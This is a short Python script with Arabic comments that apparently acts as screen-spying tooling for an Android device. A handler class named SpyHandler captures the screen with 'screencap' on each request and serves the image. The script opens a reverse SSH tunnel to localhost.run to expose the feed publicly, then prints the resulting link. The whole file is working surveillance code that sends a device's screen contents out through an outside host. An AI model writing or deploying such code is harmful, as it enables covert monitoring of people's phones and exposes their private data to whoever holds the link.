import subprocess
import time
import re
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import os

# سيرفر البث الذي يلتقط الشاشة
class SpyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'image/jpeg')
        self.end_headers()
        # التقاط الشاشة وحفظها كصورة مؤقتة
        os.system("screencap -p /sdcard/frame.jpg")
        try:
            with open("/sdcard/frame.jpg", "rb") as f:
                self.wfile.write(f.read())
        except:
            pass

def monitor_tunnel():
    print("\n[+] جاري فتح النفق العالمي... انتظر الرابط")
    # فتح النفق ومراقبة المخرجات
    cmd = "ssh -R 80:127.0.0.1:8080 nokey@localhost.run"
    process = subprocess.Popen(cmd.split(), stderr=subprocess.PIPE, text=True)
    
    for line in process.stderr:
        # البحث عن الرابط الذي ينتهي بـ .lhr.life
        match = re.search(r'https?://[a-zA-Z0-9.-]+\.lhr\.life', line)
        if match:
            url = match.group(0)
            print("\n" + "="*40)
            print(f"🔥 الرابط المباشر جاهز الآن:")
            print(f"🔗 {url}")
            print("="*40 + "\n")
            break

if __name__ == '__main__':
    # تشغيل مراقب النفق في خيط منفصل
    threading.Thread(target=monitor_tunnel, daemon=True).start()
    
    # تشغيل السيرفر على البورت 8080
    server = HTTPServer(('127.0.0.1', 8080), SpyHandler)
    print("[*] السيرفر يعمل بانتظار الاتصال...")
    server.serve_forever()

